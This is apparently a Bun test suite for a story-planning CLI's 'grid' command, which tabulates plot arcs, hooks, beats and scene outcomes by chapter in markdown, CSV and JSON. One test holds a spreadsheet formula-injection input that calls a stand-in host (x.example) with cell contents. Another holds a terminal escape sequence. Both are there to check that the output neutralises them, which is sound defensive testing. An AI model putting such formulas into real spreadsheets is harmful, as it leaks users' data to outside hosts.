import { describe, expect, test } from "bun:test";
import fs from "node:fs";
import path from "node:path";
import { runCli } from "../src/cli.js";
import { createStoryProject } from "../src/story.js";
import { RESULT_SCHEMA_PATH, validateAgainstSchema } from "../scripts/check-schema.js";
import { makeTempDir, memoryIo, writeMarkdown } from "./helpers.js";

const schema = JSON.parse(fs.readFileSync(RESULT_SCHEMA_PATH, "utf8"));

function invoke(cwd, argv) {
  const io = memoryIo(cwd);
  const code = runCli(argv, io);
  return { code, out: io.output(), err: io.error() };
}

function gridProject() {
  const cwd = makeTempDir();
  const { root } = createStoryProject({ cwd, title: "Plot Grid", force: false });
  return root;
}

function writeArc(root, id) {
  writeMarkdown(path.join(root, "plot", "arcs", `${id}.md`), `name: ${id}\ntype: main\nstatus: active`, `# ${id}\n`);
}

function writeChapter(root, number, frontmatter = "") {
  const id = `chapter-${String(number).padStart(2, "0")}`;
  writeMarkdown(path.join(root, "chapters", `${id}.md`), `title: Chapter ${number}\nnumber: ${number}\nstatus: draft\n${frontmatter}`, "## Chapter Text\n\nWords.\n");
  return id;
}

function writeScene(root, chapter, scene, frontmatter) {
  writeMarkdown(path.join(root, "scenes", `${chapter}-scene-0${scene}.md`), `title: Scene ${scene}\nchapter: ${chapter}\nscene: ${scene}\nstatus: draft\n${frontmatter}`, "# Scene\n");
}

function sampleProject() {
  const root = gridProject();
  writeArc(root, "heist");
  writeArc(root, "romance");
  writeArc(root, "dropped-thread");
  writeChapter(root, 1, "hook: question\narcs-advanced:\n  - romance");
  writeChapter(root, 2, "hook: cliffhanger\narcs-advanced:\n  - heist\n  - ghost-arc");
  writeChapter(root, 3);
  // A scene advances an arc its chapter does not list.
  writeScene(root, "chapter-03", 1, "outcome: no-and\narcs-advanced:\n  - romance");
  writeScene(root, "chapter-03", 2, "sequel: true\noutcome: yes");
  writeScene(root, "chapter-01", 2, "outcome: yes");
  writeScene(root, "chapter-01", 1, "outcome: yes-but");
  return root;
}

describe("story grid", () => {
  test("prints arcs by chapter, with hooks and scene outcomes, as a markdown table", () => {
    const root = sampleProject();
    const { code, out, err } = invoke(root, ["grid"]);
    expect(code).toBe(0);
    expect(err).toBe("");
    expect(out).toBe([
      "| Arc                 | 1            | 2           | 3      |",
      "|---------------------|:------------:|:-----------:|:------:|",
      "| romance             | x            |             | x      |",
      "| heist               |              | x           |        |",
      "| dropped-thread      |              |             |        |",
      "| ghost-arc (unknown) |              | x           |        |",
      "| (hook)              | question     | cliffhanger |        |",
      "| (outcomes)          | yes-but, yes |             | no-and |",
      ""
    ].join("\n"));
  });

  test("--format csv quotes cells that need it", () => {
    const root = gridProject();
    writeArc(root, "heist");
    writeChapter(root, 1, "hook: \"a, \\\"b\\\"\"\narcs-advanced:\n  - heist");
    const { code, out } = invoke(root, ["grid", "--format", "csv"]);
    expect(code).toBe(0);
    expect(out).toBe("Arc,1\nheist,x\n(hook),\"a, \"\"b\"\"\"\n(outcomes),\n");
  });

  test("markdown escapes a pipe in a cell", () => {
    const root = gridProject();
    writeChapter(root, 1, "hook: a | b");
    expect(invoke(root, ["grid"]).out).toContain("| a \\| b |");
  });

  test("three-digit chapter numbers keep the columns aligned", () => {
    const root = gridProject();
    writeArc(root, "heist");
    for (const number of [9, 10, 100]) {
      writeChapter(root, number, "arcs-advanced:\n  - heist");
    }
    const lines = invoke(root, ["grid"]).out.trimEnd().split("\n");
    expect(lines[0]).toBe("| Arc        | 9   | 10  | 100 |");
    expect(new Set(lines.map((line) => line.length)).size).toBe(1);
  });

  test("--from and --to take a chapter id or number and narrow the columns", () => {
    const root = sampleProject();
    const { code, out } = invoke(root, ["grid", "--from", "2", "--to", "chapter-03", "--format", "csv"]);
    expect(code).toBe(0);
    expect(out).toBe("Arc,2,3\nromance,,x\nheist,x,\ndropped-thread,,\nghost-arc (unknown),x,\n(hook),cliffhanger,\n(outcomes),,no-and\n");
  });

  test("a range that runs backwards, an unknown chapter, or an unknown format is a usage error", () => {
    const root = sampleProject();
    const backwards = invoke(root, ["grid", "--from", "3", "--to", "1"]);
    expect(backwards.code).toBe(2);
    expect(backwards.err).toContain("--from 3 comes after --to 1");
    const missing = invoke(root, ["grid", "--to", "chapter-09"]);
    expect(missing.code).toBe(2);
    expect(missing.err).toContain("--to chapter-09 is not a chapter");
    const format = invoke(root, ["grid", "--format", "epub"]);
    expect(format.code).toBe(2);
    expect(format.err).toContain("Unknown grid format: epub");
  });

  test("a branching book lists every chapter in number order", () => {
    const root = gridProject();
    writeChapter(root, 1, "choices:\n  - text: Left\n    to: chapter-03\n  - text: Right\n    to: chapter-02");
    writeChapter(root, 2);
    writeChapter(root, 3);
    expect(invoke(root, ["grid", "--format", "csv"]).out.split("\n")[0]).toBe("Arc,1,2,3");
  });

  test("an unreadable chapter prints no grid and exits 1", () => {
    const root = sampleProject();
    fs.writeFileSync(path.join(root, "chapters", "chapter-04.md"), "---\ntitle: [\n---\n", "utf8");
    const { code, out, err } = invoke(root, ["grid"]);
    expect(code).toBe(1);
    expect(out).toBe("");
    expect(err).toContain("Grid failed");
  });

  test("a range naming an unreadable chapter reports the parse error, not an unknown chapter", () => {
    const root = sampleProject();
    fs.writeFileSync(path.join(root, "chapters", "chapter-04.md"), "---\ntitle: [\n---\n", "utf8");
    const text = invoke(root, ["grid", "--from", "chapter-04"]);
    expect(text.code).toBe(1);
    expect(text.err).toContain("chapters/chapter-04.md");
    expect(text.err).not.toContain("is not a chapter");
    const json = invoke(root, ["grid", "--to", "4", "--json"]);
    expect(json.code).toBe(1);
    const envelope = JSON.parse(json.out);
    expect(validateAgainstSchema(envelope, schema)).toEqual([]);
    expect(envelope.diagnostics.some((entry) => entry.file === "chapters/chapter-04.md")).toBe(true);
  });

  test("--json reports the chapters and arc rows", () => {
    const root = sampleProject();
    const { code, out, err } = invoke(root, ["grid", "--from", "chapter-02", "--json"]);
    expect(code).toBe(0);
    expect(err).toBe("");
    const envelope = JSON.parse(out);
    expect(validateAgainstSchema(envelope, schema)).toEqual([]);
    expect(envelope.command).toBe("grid");
    expect(envelope.data.range).toEqual({ from: "chapter-02", to: "chapter-03", total: 3 });
    expect(envelope.data.chapters.map((chapter) => [chapter.id, chapter.hook, chapter.outcomes])).toEqual([
      ["chapter-02", "cliffhanger", []],
      ["chapter-03", "", ["no-and"]]
    ]);
    expect(envelope.data.rows.find((row) => row.id === "ghost-arc")).toEqual({ id: "ghost-arc", name: null, status: null, known: false, cells: [true, false] });
    expect(envelope.data.rows.find((row) => row.id === "romance")).toMatchObject({ name: "romance", status: "active", known: true, cells: [false, true] });
  });

  test("once any chapter has a beat, a (beat) row sits above the hook and outcome rows", () => {
    const root = sampleProject();
    const chapter = path.join(root, "chapters", "chapter-03.md");
    fs.writeFileSync(chapter, fs.readFileSync(chapter, "utf8").replace("status: draft\n", "status: draft\nbeat: Midpoint\n"), "utf8");
    writeChapter(root, 4, "beat: \"All Is Lost | Dark Night\"\nhook: cliffhanger");
    const { code, out, err } = invoke(root, ["grid"]);
    expect(code).toBe(0);
    expect(err).toBe("");
    expect(out).toBe([
      "| Arc                 | 1            | 2           | 3        | 4                         |",
      "|---------------------|:------------:|:-----------:|:--------:|:-------------------------:|",
      "| romance             | x            |             | x        |                           |",
      "| heist               |              | x           |          |                           |",
      "| dropped-thread      |              |             |          |                           |",
      "| ghost-arc (unknown) |              | x           |          |                           |",
      "| (beat)              |              |             | Midpoint | All Is Lost \\| Dark Night |",
      "| (hook)              | question     | cliffhanger |          | cliffhanger               |",
      "| (outcomes)          | yes-but, yes |             | no-and   |                           |",
      ""
    ].join("\n"));
  });

  test("a range with no beats still shows the (beat) row when the book has them", () => {
    const root = sampleProject();
    writeChapter(root, 4, "beat: \"Catalyst, late\"");
    expect(invoke(root, ["grid", "--format", "csv", "--to", "2"]).out).toBe("Arc,1,2\nromance,x,\nheist,,x\ndropped-thread,,\nghost-arc (unknown),,x\n(beat),,\n(hook),question,cliffhanger\n(outcomes),\"yes-but, yes\",\n");
    expect(invoke(root, ["grid", "--format", "csv", "--from", "4"]).out).toBe("Arc,4\nromance,\nheist,\ndropped-thread,\nghost-arc (unknown),\n(beat),\"Catalyst, late\"\n(hook),\n(outcomes),\n");
  });

  test("a beat written over several lines shows on one, and a beat that is not text shows as none", () => {
    const root = gridProject();
    writeChapter(root, 1, "beat: |\n  Break into\n    Two  ");
    writeChapter(root, 2, "beat: 1984");
    expect(invoke(root, ["grid", "--format", "csv"]).out).toBe("Arc,1,2\n(beat),Break into Two,\n(hook),,\n(outcomes),,\n");
  });

  test("blank beats, ~ among them, leave the book without a beat row (#531)", () => {
    const root = gridProject();
    writeChapter(root, 1, "beat: \"\"\nhook: question");
    writeChapter(root, 2, "beat: \"   \"");
    writeChapter(root, 3, "beat: ~");
    expect(invoke(root, ["grid", "--format", "csv"]).out).toBe("Arc,1,2,3\n(hook),question,,\n(outcomes),,,\n");
    expect(JSON.parse(invoke(root, ["grid", "--json"]).out).data.beats).toBe(false);
  });

  test("a control character in a beat prints as U+FFFD, so it cannot drive the terminal", () => {
    const root = gridProject();
    writeChapter(root, 1, "beat: \"Mid\\u001b[2Jpoint,\\tlate\"");
    expect(invoke(root, ["grid", "--format", "csv"]).out).toBe("Arc,1\n(beat),\"Mid\ufffd[2Jpoint, late\"\n(hook),\n(outcomes),\n");
  });

  test("--format csv starts a cell a spreadsheet would read as a formula with a quote", () => {
    const root = gridProject();
    writeChapter(root, 1, "beat: \"=IMAGE(CONCAT(\\\"https://x.example/?q=\\\";A2))\"");
    writeChapter(root, 2, "beat: \"+1 twist\"\narcs-advanced:\n  - \"@sum\"");
    writeChapter(root, 3, "beat: \"- Midpoint\"");
    expect(invoke(root, ["grid", "--format", "csv"]).out).toBe([
      "Arc,1,2,3",
      "'@sum (unknown),,x,",
      "(beat),\"'=IMAGE(CONCAT(\"\"https://x.example/?q=\"\";A2))\",'+1 twist,'- Midpoint",
      "(hook),,,",
      "(outcomes),,,",
      ""
    ].join("\n"));
    // The markdown table is not a spreadsheet, so it shows the text as is.
    expect(invoke(root, ["grid"]).out).toContain("| =IMAGE(");
  });

  test("columns line up by terminal width for wide and combining characters", () => {
    const root = gridProject();
    writeChapter(root, 1, "beat: 中点");
    writeChapter(root, 2, "beat: \"🔥 All Is Lost\"");
    writeChapter(root, 3, "beat: Cafe\u0301 scene");
    const lines = invoke(root, ["grid"]).out.trimEnd().split("\n");
    expect(lines).toEqual([
      "| Arc        | 1    | 2              | 3          |",
      "|------------|:----:|:--------------:|:----------:|",
      "| (beat)     | 中点 | 🔥 All Is Lost | Cafe\u0301 scene |",
      "| (hook)     |      |                |            |",
      "| (outcomes) |      |                |            |"
    ]);
  });

  test("--json gives each chapter's beat and whether the book has any", () => {
    const root = sampleProject();
    const without = JSON.parse(invoke(root, ["grid", "--json"]).out);
    expect(without.data.beats).toBe(false);
    expect(without.data.chapters.map((chapter) => chapter.beat)).toEqual(["", "", ""]);

    writeChapter(root, 4, "beat: Finale\nhook: resolution");
    const { code, out } = invoke(root, ["grid", "--from", "3", "--json"]);
    expect(code).toBe(0);
    const envelope = JSON.parse(out);
    expect(validateAgainstSchema(envelope, schema)).toEqual([]);
    expect(envelope.data.beats).toBe(true);
    expect(envelope.data.chapters.map((chapter) => [chapter.id, chapter.beat, chapter.hook, chapter.outcomes])).toEqual([
      ["chapter-03", "", "", ["no-and"]],
      ["chapter-04", "Finale", "resolution", []]
    ]);
  });

  test("an empty book prints just the label rows", () => {
    const root = gridProject();
    const { code, out } = invoke(root, ["grid", "--format", "csv"]);
    expect(code).toBe(0);
    expect(out).toBe("Arc\n(hook)\n(outcomes)\n");
  });
});
